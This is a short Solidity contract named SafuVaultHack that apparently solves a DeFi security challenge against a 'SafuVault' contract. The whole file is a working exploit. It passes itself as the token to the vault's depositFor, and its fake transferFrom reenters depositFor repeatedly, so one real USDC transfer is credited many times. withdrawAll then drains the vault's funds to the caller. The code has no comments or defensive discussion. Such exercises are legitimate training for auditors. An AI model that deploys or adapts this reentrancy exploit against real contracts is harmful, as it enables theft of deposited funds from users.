pragma solidity ^0.8.0;

import "../safu-vault/SafuVault.sol";

contract SafuVaultHack {
    uint256 private count;
    uint256 private calls = 10;
    IERC20 private immutable USDC;
    SafuVault private immutable VAULT;

    constructor(IERC20 usdc, SafuVault vault) {
        USDC = usdc;
        VAULT = vault;
    }

    function run(uint256 amountIn) external {
        USDC.transferFrom(msg.sender, address(this), amountIn);
        uint256 amount = USDC.balanceOf(address(this)) / calls;
        VAULT.depositFor(address(this), amount, address(this));
        VAULT.withdrawAll();
        USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external {
        if (count++ < calls) {
            USDC.transfer(msg.sender, amount);
            VAULT.depositFor(address(this), amount, address(this));
        }
    }
}
